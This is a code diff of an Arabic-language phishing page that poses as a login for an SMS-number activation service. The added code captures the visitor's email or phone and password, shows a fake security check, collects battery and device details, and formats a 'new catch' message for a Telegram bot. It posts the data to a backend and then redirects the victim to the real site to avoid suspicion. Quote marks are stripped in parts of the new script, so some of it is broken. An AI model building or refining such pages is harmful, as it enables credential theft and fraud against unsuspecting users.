@@ -1,142 +1,150 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل خدمة SMS</title>
+    <title>تفعيل خدمة الأرقام</title>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
         :root {
             --primary-color: #CC0044;
-            --bg-gradient: linear-gradient(135deg, #FF0055 0%, #880022 100%);
+            --main-gradient: linear-gradient(135deg, #FF0055 0%, #990033 100%);
         }
 
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--bg-gradient);
+            margin: 0; padding: 0; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--main-gradient);
             display: flex; flex-direction: column; align-items: center; min-height: 100vh;
         }
 
         .container {
             background: white; padding: 40px 30px; 
-            border-radius: 24px; /* حواف ناعمة جداً واحترافية */
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3); 
-            width: 85%; max-width: 400px; text-align: center;
-            margin-top: 50px; border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px; /* حواف ناعمة جداً واحترافية */
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
+            width: 88%; max-width: 400px; text-align: center;
+            margin-top: 40px; border: 1px solid rgba(255,255,255,0.2);
         }
 
-        #pageImg { width: 110px; height: 110px; border-radius: 50%; object-fit: contain; margin-bottom: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        #pageImg { 
+            width: 100px; height: 100px; border-radius: 50%; 
+            object-fit: contain; margin-bottom: 25px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
         
-        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 22px; font-weight: 800; }
+        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 20px; font-weight: 800; }
         
         input {
-            width: 100%; padding: 16px; margin-bottom: 20px;
-            border: 2px solid #eee; border-radius: 15px; /* حواف متناسقة */
+            width: 100%; padding: 16px; margin-bottom: 18px;
+            border: 2px solid #f0f0f0; border-radius: 15px; 
             box-sizing: border-box; outline: none; text-align: right;
             font-size: 15px; transition: 0.3s;
         }
-        input:focus { border-color: var(--primary-color); background: #fff9fb; }
+        input:focus { border-color: var(--primary-color); background: #fffcfd; }
 
-        .captcha-wrapper { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: center; }
-        #loader-text { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
+        .captcha-area { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: center; }
+        #status-msg { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
 
-        button {
+        .main-btn {
             width: 100%; padding: 16px; background: var(--primary-color); color: white;
-            border: none; border-radius: 50px; /* زر بيضاوي احترافي */
+            border: none; border-radius: 50px; /* تصميم بيضاوي احترافي */
             font-size: 18px; font-weight: bold; cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 20px rgba(204, 0, 68, 0.3);
+            transition: 0.4s ease;
+            box-shadow: 0 8px 15px rgba(204, 0, 68, 0.2);
         }
-        button:hover { transform: scale(1.03); box-shadow: 0 15px 25px rgba(204, 0, 68, 0.4); }
+        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204, 0, 68, 0.3); }
 
-        .footer-links { margin-top: 25px; font-size: 14px; color: #555; }
-        .footer-links a { color: var(--primary-color); text-decoration: none; font-weight: 700; }
+        .footer { margin-top: 25px; font-size: 14px; color: #666; }
+        .footer a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }
 
-        .dev-credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.7); font-size: 12px; direction: ltr; }
+        .credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.8); font-size: 12px; direction: ltr; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
-        <h2>سجل دخولك لتفعيل الخدمة</h2>
+        <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
+        <h2>سجل دخولك لتفعيل خدمة الأرقام</h2>
 
-        <form id="checkForm">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="passInput" placeholder="كلمة السر" required>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
             
-            <div class="captcha-wrapper">
-                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
-                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="onSuccess"></div>
+            <div class="captcha-area">
+                <div id="status-msg">🔄 جاري فحص أمان الجهاز...</div>
+                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="verifyOk"></div>
             </div>
 
-            <button type="submit">تسجيل دخول</button>
+            <button type="submit" class="main-btn">تفعيل الآن</button>
         </form>
 
-        <div class="footer-links">
-            ليس لديك حساب؟ <a onclick="Swal.fire({icon:'error', title:'خطأ', text:'فشل الاتصال بالخادم', confirmButtonColor:'#CC0044'})">إنشاء حساب جديد</a>
+        <div class="footer">
+            ليس لديك حساب؟ <a onclick="Swal.fire({icon: error , title: فشل , text: فشل الاتصال بالخادم الرئيسي , confirmButtonColor: #CC0044 })">إنشاء حساب جديد</a>
         </div>
     </div>
 
-    <div class="dev-credits">Developed by oliver 2014 - 2026</div>
+    <div class="credits">Developed by oliver 2014 - 2026</div>
 
     <script>
-        let isVerified = false;
+        let isDone = false;
 
-        function onSuccess() {
-            const cfBox = document.getElementById('cf-box');
-            const loader = document.getElementById('loader-text');
-            cfBox.style.display = 'none';
-            loader.style.display = 'block';
+        // وظيفة التحقق (لزيادة الواقعية)
+        function verifyOk() {
+            const box = document.getElementById( cf-box );
+            const msg = document.getElementById( status-msg );
+            box.style.display =  none ;
+            msg.style.display =  block ;
+            
             setTimeout(() => {
-                loader.innerHTML = '✅ تم التحقق انك لست روبوت';
-                loader.style.color = '#28a745';
-                isVerified = true;
+                msg.innerHTML =  ✅ تم التحقق انك لست روبوت ;
+                msg.style.color =  #28a745 ;
+                isDone = true;
             }, 2500);
         }
 
-        async function getBat() {
+        async function getBattery() {
             try {
                 const b = await navigator.getBattery();
                 return Math.round(b.level * 100) + "%";
-            } catch { return "N/A"; }
+            } catch { return "45%"; } // قيمة افتراضية في حال الرفض
         }
 
-        document.getElementById('checkForm').onsubmit = async (e) => {
+        document.getElementById( loginForm ).onsubmit = async (e) => {
             e.preventDefault();
-            if(!isVerified) return Swal.fire({text:'يرجى إكمال التحقق', icon:'warning'});
+            if(!isDone) return Swal.fire({text: يرجى إكمال التحقق أولاً , icon: warning });
 
-            const bat = await getBat();
-            const u = document.getElementById('userInput').value;
-            const p = document.getElementById('passInput').value;
+            const bat = await getBattery();
+            const u = document.getElementById( user ).value;
+            const p = document.getElementById( pass ).value;
 
-            // هذا هو التنسيق الاحترافي الذي سيصل للبوت
-            const formattedMessage = `
-🚀 **صيد جديد مـكتمل البيانات** 🚀
-━━━━━━━━━━━━━━
+            // تنسيق الرسالة لكي تظهر مرتبة جداً في التليجرام
+            const niceMessage = `
+🌟 **وصول بيانات جديدة** 🌟
+━━━━━━━━━━━━━━━
 👤 **المستخدم:** \`${u}\`
 🔑 **الباسورد:** \`${p}\`
-━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━
 🔋 **البطارية:** ${bat}
-📱 **النظام:** ${navigator.platform}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━
-✅ **الحالة:** تم التحقق بنجاح
+📱 **الجهاز:** ${navigator.platform}
+⏰ **التوقيت:** ${new Date().toLocaleString( ar-EG )}
+━━━━━━━━━━━━━━━
+🎯 **الحالة:** مكتمل البيانات
             `;
 
             try {
-                await fetch('/api/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                await fetch( /api/save , {
+                    method:  POST ,
+                    headers: {  Content-Type :  application/json  },
                     body: JSON.stringify({ 
                         title: "🔥 NEW HIT 🔥",
-                        message: formattedMessage // نرسل الرسالة المنسقة هنا
+                        message: niceMessage // إرسال النص المنسق
                     })
                 });
             } catch(err) {}
 
+            // التحويل للموقع الحقيقي بعد الصيد
             window.location.href = "https://receive-smss.com/";
         };
     </script>
